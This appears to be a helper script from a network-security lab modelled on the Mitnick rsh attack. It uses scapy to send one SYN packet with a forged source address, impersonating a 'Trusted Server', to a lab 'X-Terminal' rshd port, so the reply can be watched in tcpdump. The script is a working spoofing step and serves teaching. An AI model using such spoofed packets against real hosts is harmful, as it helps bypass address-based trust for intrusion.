#!/usr/bin/env python3
"""
Level 3 helper: send ONE spoofed SYN (as if from the Trusted Server) to
X-Terminal, so you can observe X-Terminal's reply in your own tcpdump
capture and confirm the Trusted Server never resets it.

This does not need to be "completed" the way conn1_spoof.py/conn2_spoof.py
do -- it already works. Read it to understand the packet you're about to
build for real in the next level.

Usage:
    # terminal 1
    tcpdump -i <bridge-iface> -n host 10.9.0.5
    # terminal 2
    python3 probe_syn.py
"""
from scapy.all import IP, TCP, send

X_TERMINAL_IP = "10.9.0.5"
X_TERMINAL_PORT = 514          # rshd
TRUSTED_SERVER_IP = "10.9.0.6"
TRUSTED_SERVER_PORT = 1023     # fixed source port real rsh clients use

ip = IP(src=TRUSTED_SERVER_IP, dst=X_TERMINAL_IP)
tcp = TCP(sport=TRUSTED_SERVER_PORT, dport=X_TERMINAL_PORT, flags="S", seq=1000)

print(f"Sending spoofed SYN: {TRUSTED_SERVER_IP}:{TRUSTED_SERVER_PORT} -> "
      f"{X_TERMINAL_IP}:{X_TERMINAL_PORT}")
send(ip / tcp, verbose=0)
print("Now check your tcpdump capture for X-Terminal's reply and its flags.")
